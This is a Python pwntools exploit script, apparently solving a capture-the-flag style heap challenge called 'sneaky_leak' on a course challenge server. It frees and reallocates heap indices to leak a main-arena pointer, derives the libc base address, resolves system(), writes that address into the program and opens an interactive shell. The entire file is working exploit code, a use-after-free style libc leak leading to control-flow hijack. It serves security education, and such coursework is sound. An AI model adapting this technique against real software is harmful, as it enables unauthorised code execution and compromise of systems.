from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./sneaky_leak"

LOCAL = True

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1210)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"What do you want to do?\n")
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def free_index(p, index):
    p.recvuntil(b"What index would you like to free?\n")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    return p.recvline().decode()

def allocate_index(p, index):
    p.recvuntil(b"What index would you like to (re)allocate?\n")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    return p.recvline().decode()

def read_index(p, index):
    p.recvuntil(b"What index would you like to read?\n")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())

    p.recvuntil("Ok! This buffer holds the following data: ")

    head_main_arena =  u64(p.recvline().strip().ljust(8, b'\x00'))
    glibc_leak = head_main_arena & ~0xfff
    print(f'head_main_arena: {hex(glibc_leak)}')
    return glibc_leak

menu(p, 1)
free_index(p, 124)
menu(p, 1)
free_index(p, 125)
menu(p, 3)
allocate_index(p, 125)
menu(p, 2)
head_main_arena = read_index(p, 125)
base_address = head_main_arena - 0x1ed000
print(f'base_address: {hex(base_address)}')

libc_elf = ELF(libc, checksec=False)
libc_elf.address = base_address
system = libc_elf.symbols.system
print(f'system: {hex(system)}')

menu(p, 4)
p.recvuntil('> ')
p.send(p64(system))

p.interactive()